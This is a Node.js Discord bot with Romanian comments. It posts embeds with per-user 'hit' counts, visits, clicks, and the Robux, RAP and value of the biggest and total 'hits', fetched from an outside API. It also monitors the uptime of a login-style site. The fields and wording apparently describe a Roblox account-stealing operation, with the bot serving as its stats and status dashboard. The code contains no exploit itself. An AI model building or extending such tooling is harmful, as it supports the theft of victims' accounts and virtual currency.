// stats-check-daily.js  (Discord.js v14)
// Folosește: node >=16, discord.js v14, node-fetch

const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fetch = require('node-fetch');

const TOKEN = process.env.DISCORD_BOT_TOKEN;
if (!TOKEN) {
  console.error('❌ DISCORD_BOT_TOKEN not set in env');
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

// Config
const STATUS_CHANNEL_ID = '1436098432413597726'; // canalul pentru announces (așa ai cerut)
const MAIN_SITE_URL = 'https://www.logged.tg/auth/corrupteds'; // noul site pentru !check și monitor
const STATS_BANNER = 'https://i.imgur.com/rCQ33gA.gif'; // banner jos pentru stats/daily
const CHECK_BANNER = 'https://i.imgur.com/8ybiT0H.gif'; // banner jos pentru check/announces (decât daca vrei altul schimbi)
const CROWN_EMOJI_CDN = 'https://cdn.discordapp.com/emojis/1437165310775132160.gif'; // emoji_22
const TITLE_EMOJI = '1437165438315532431'; // emoji_23 (titlu)
const ARROW_EMOJI = '1437163698161717468'; // emoji_21 (la inceputul propozitiilor)
const BUTTON_EMOJI = '1437155312527347915'; // emoji_16 (folosit anterior pentru butoane, pastrat in cazul in care vrei later)

// utilitare
function formatNumber(n) { return Number(n || 0).toLocaleString(); }
function formatDuration(ms) {
  let sec = Math.floor(ms / 1000);
  let min = Math.floor(sec / 60);
  let hr = Math.floor(min / 60);
  sec %= 60; min %= 60;
  return `${hr}h ${min}m ${sec}s`;
}

// Monitor site (for announces)
let lastUpTime = null;
let lastStatus = null;

function createStatusEmbed(status, ping) {
  const statusEmoji = status === 'UP' ? `<a:corrupt_verify:1437152885480886312>` : '❌';
  const uptimeText = status === 'UP' && lastUpTime ? formatDuration(Date.now() - lastUpTime) : '❌ No uptime data';
  return new EmbedBuilder()
    .setColor('#89CFF0')
    .setTitle(`— <a:${TITLE_EMOJI}:1437165438315532431> SITE STATUS —`)
    .setThumbnail(CROWN_EMOJI_CDN)
    .setDescription(
      `<a:${ARROW_EMOJI}:1437163698161717468> **MAIN SITE**\n` +
      `<a:${ARROW_EMOJI}:1437163698161717468> Status: ${status === 'UP' ? 'ONLINE' : 'OFFLINE'} ${statusEmoji}\n` +
      `<a:${ARROW_EMOJI}:1437163698161717468> Uptime: ${uptimeText}\n\n` +
      `\`\`\`Response Time: ${ping ? ping + 'ms' : 'N/A'}\`\`\``
    )
    .setImage(CHECK_BANNER)
    .setFooter({ text: 'Site Uptime Monitor' });
}

// Interval automat pentru announces (trimite in canalul STATUS_CHANNEL_ID cand se schimba statusul)
setInterval(async () => {
  try {
    const start = Date.now();
    let res, ping;
    try {
      const response = await fetch(MAIN_SITE_URL);
      res = { ok: response.ok };
      ping = Date.now() - start;
    } catch {
      res = { ok: false };
      ping = null;
    }

    const currentStatus = res.ok ? 'UP' : 'DOWN';
    if (res.ok && !lastUpTime) lastUpTime = Date.now();
    if (!res.ok) lastUpTime = null;

    if (currentStatus !== lastStatus) {
      const channel = await client.channels.fetch(STATUS_CHANNEL_ID).catch(() => null);
      if (channel && channel.send) {
        const embed = createStatusEmbed(currentStatus, ping);
        await channel.send({ embeds: [embed] }).catch(() => {});
      }
      lastStatus = currentStatus;
    }
  } catch (err) {
    console.error('Monitor interval error:', err);
  }
}, 30000); // 30s

// send stats/daily embed helper (keeps alignment and emojis)
function buildStatsEmbed(titleText, userDisplayName, thumbnailUrl, statsObj, bannerUrl, footerText) {
  return new EmbedBuilder()
    .setColor('#89CFF0')
    .setTitle(`— <a:${TITLE_EMOJI}:1437165438315532431> ${titleText} —`)
    .setThumbnail(thumbnailUrl)
    .setDescription(
      `<a:${ARROW_EMOJI}:1437163698161717468> User: **${userDisplayName}**\n\n` +
      `<a:${ARROW_EMOJI}:1437163698161717468> TOTAL STATS:\n` +
      `Hits:     ${formatNumber(statsObj.Totals?.Accounts)}\n` +
      `Visits:   ${formatNumber(statsObj.Totals?.Visits)}\n` +
      `Clicks:   ${formatNumber(statsObj.Totals?.Clicks)}\n\n` +
      `<a:${ARROW_EMOJI}:1437163698161717468> BIGGEST HIT:\n` +
      `Summary:  ${formatNumber(statsObj.Highest?.Summary)}\n` +
      `RAP:      ${formatNumber(statsObj.Highest?.Rap)}\n` +
      `Robux:    ${formatNumber(statsObj.Highest?.Balance)}\n\n` +
      `<a:${ARROW_EMOJI}:1437163698161717468> TOTAL HIT STATS:\n` +
      `Summary:  ${formatNumber(statsObj.TotalSummary)}\n` +
      `RAP:      ${formatNumber(statsObj.TotalRap)}\n` +
      `Robux:    ${formatNumber(statsObj.TotalRobux)}`
    )
    .setImage(bannerUrl)
    .setFooter({ text: footerText || 'Stats Bot' });
}

// client events & commands
client.on('ready', () => {
  console.log(`✅ Bot ready as ${client.user.tag}`);
});

// single messageCreate handler for commands
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  const content = message.content.trim();
  const args = content.split(/\s+/);
  const cmd = args[0].toLowerCase();

  // determine target user for stats/daily
  const targetUser = message.mentions.users.first() || message.author;
  const targetId = targetUser.id;

  // ===== !stats =====
  if (cmd === '!stats') {
    try {
      const res = await fetch(`https://api.injuries.lu/v1/public/user?userId=${targetId}`);
      const data = await res.json();
      if (!data || !data.success || !data.Normal) {
        return message.reply('❌ No stats found.');
      }

      const normal = data.Normal;
      // calc total manual if Hits array present
      let totalSummary = 0, totalRap = 0, totalRobux = 0;
      if (Array.isArray(normal.Hits) && normal.Hits.length) {
        normal.Hits.forEach(h => {
          totalSummary += Number(h.Summary || 0);
          totalRap += Number(h.Rap || 0);
          totalRobux += Number(h.Balance || 0);
        });
      } else {
        totalSummary = Number(normal.Totals?.Summary || 0);
        totalRap = Number(normal.Totals?.Rap || 0);
        totalRobux = Number(normal.Totals?.Balance || 0);
      }

      // attach totals for display helper
      normal.TotalSummary = totalSummary;
      normal.TotalRap = totalRap;
      normal.TotalRobux = totalRobux;

      const embed = buildStatsEmbed(
        'NORMAL INFO',
        data.Profile?.userName || targetUser.username,
        targetUser.displayAvatarURL({ dynamic: true, size: 128 }),
        normal,
        STATS_BANNER,
        'Stats Bot'
      );

      await message.channel.send({ embeds: [embed] });
    } catch (err) {
      console.error('!stats error:', err);
      message.reply('❌ Error fetching stats.');
    }
    return;
  }

  // ===== !daily =====
  if (cmd === '!daily') {
    try {
      const DAILY_API = `https://api.injuries.lu/v2/daily?type=0x2&cs=3&ref=corrupteds&userId=${targetId}`;
      const res = await fetch(DAILY_API);
      const data = await res.json();
      // note: some v2 responses differ; handle flexible shapes
      const normal = data?.Normal || data?.Daily || data;
      if (!normal) return message.reply('❌ No daily stats found.');

      // compute totals if hits present
      let totalSummary = 0, totalRap = 0, totalRobux = 0;
      if (Array.isArray(normal.Hits) && normal.Hits.length) {
        normal.Hits.forEach(h => {
          totalSummary += Number(h.Summary || 0);
          totalRap += Number(h.Rap || 0);
          totalRobux += Number(h.Balance || 0);
        });
      } else {
        totalSummary = Number(normal.Totals?.Summary || 0);
        totalRap = Number(normal.Totals?.Rap || 0);
        totalRobux = Number(normal.Totals?.Balance || 0);
      }

      normal.TotalSummary = totalSummary;
      normal.TotalRap = totalRap;
      normal.TotalRobux = totalRobux;

      const embed = buildStatsEmbed(
        'DAILY STATS',
        data.Profile?.userName || targetUser.username,
        targetUser.displayAvatarURL({ dynamic: true, size: 128 }),
        normal,
        STATS_BANNER,
        'Stats Bot Daily'
      );

      await message.channel.send({ embeds: [embed] });
    } catch (err) {
      console.error('!daily error:', err);
      message.reply('❌ Error fetching daily stats.');
    }
    return;
  }

  // ===== !check =====
  if (cmd === '!check') {
    try {
      const start = Date.now();
      let res, ping;
      try {
        const response = await fetch(MAIN_SITE_URL);
        res = { ok: response.ok };
        ping = Date.now() - start;
      } catch {
        res = { ok: false };
        ping = null;
      }

      if (res.ok && !lastUpTime) lastUpTime = Date.now();
      if (!res.ok) lastUpTime = null;

      const status = res.ok ? 'UP' : 'DOWN';
      const embed = createStatusEmbed(status, ping);

      await message.channel.send({ embeds: [embed] });
    } catch (err) {
      console.error('!check error:', err);
      message.reply('❌ Error fetching site status.');
    }
    return;
  }

  // ===== !announces ===== optionally manual announce to channel (admin-only simple check)
  if (cmd === '!announces') {
    // only allow if message author has MANAGE_GUILD or is admin role? Keeping simple: allow sender if they are guild owner or have manage messages
    if (!message.member.permissions.has('ManageGuild') && message.author.id !== message.guild?.ownerId) {
      return message.reply('❌ You do not have permission to run this command.');
    }
    try {
      // build and send current status to the configured channel
      const start = Date.now();
      let res, ping;
      try {
        const response = await fetch(MAIN_SITE_URL);
        res = { ok: response.ok };
        ping = Date.now() - start;
      } catch {
        res = { ok: false };
        ping = null;
      }
      const status = res.ok ? 'UP' : 'DOWN';
      const embed = createStatusEmbed(status, ping);
      const channel = await client.channels.fetch(STATUS_CHANNEL_ID).catch(() => null);
      if (channel && channel.send) await channel.send({ embeds: [embed] });
      return message.reply('✅ Announce sent.');
    } catch (err) {
      console.error('!announces error:', err);
      return message.reply('❌ Error sending announce.');
    }
  }
});

// login
client.login(TOKEN);
